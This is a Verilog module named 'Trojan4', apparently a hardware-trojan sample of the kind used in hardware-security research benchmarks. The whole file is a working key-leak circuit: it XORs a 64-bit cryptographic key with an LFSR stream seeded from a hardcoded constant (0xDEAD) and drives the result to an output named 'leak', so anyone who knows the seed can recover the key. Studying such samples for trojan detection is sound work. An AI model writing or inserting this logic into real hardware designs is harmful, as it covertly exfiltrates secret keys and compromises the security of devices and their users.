module Trojan4 #(
    parameter SECRET_KEY = 16'hDEAD
)(
    input wire clk,
    input wire rst,
    input wire [63:0] key,
    output reg [63:0] leak
);
    reg [15:0] lfsr;
    
    always @(posedge clk or posedge rst) begin
        if (rst)
            lfsr <= SECRET_KEY;
        else
            lfsr <= {lfsr[14:0], lfsr[15] ^ lfsr[13] ^ lfsr[12] ^ lfsr[10]};
    end
    
    always @(posedge clk or posedge rst) begin
        if (rst)
            leak <= 64'b0;
        else
            leak <= key ^ {4{lfsr}};
    end
    
endmodule
